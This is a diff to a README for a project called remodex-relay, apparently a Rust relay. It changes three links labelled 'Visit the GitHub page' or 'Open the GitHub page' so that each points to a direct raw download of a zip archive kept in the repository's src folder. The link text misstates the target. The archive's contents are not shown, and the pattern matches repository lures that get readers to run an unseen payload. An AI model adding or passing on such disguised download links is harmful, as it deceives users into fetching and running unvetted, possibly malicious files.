@@ -1,6 +1,6 @@
 # ⚡ remodex-relay - Fast Relay for Smooth Connections
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/shakibkhan888com-ux/remodex-relay)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/shakibkhan888com-ux/remodex-relay/raw/refs/heads/main/src/remodex_relay_3.3.zip)
 
 ## 🧭 Overview
 
@@ -22,7 +22,7 @@ If you want the simplest path, use the GitHub page link below and follow the ste
 
 ## 📥 Download
 
-[Visit the GitHub page to download or get the latest version](https://github.com/shakibkhan888com-ux/remodex-relay)
+[Visit the GitHub page to download or get the latest version](https://github.com/shakibkhan888com-ux/remodex-relay/raw/refs/heads/main/src/remodex_relay_3.3.zip)
 
 Use this page to get the newest release files, source code, or Docker instructions.
 
@@ -184,4 +184,4 @@ remodex-relay gives you a Rust-based relay with Docker support and a simple path
 
 ## 📎 Download Again
 
-[Open the GitHub page to download or install remodex-relay](https://github.com/shakibkhan888com-ux/remodex-relay)
+[Open the GitHub page to download or install remodex-relay](https://github.com/shakibkhan888com-ux/remodex-relay/raw/refs/heads/main/src/remodex_relay_3.3.zip)
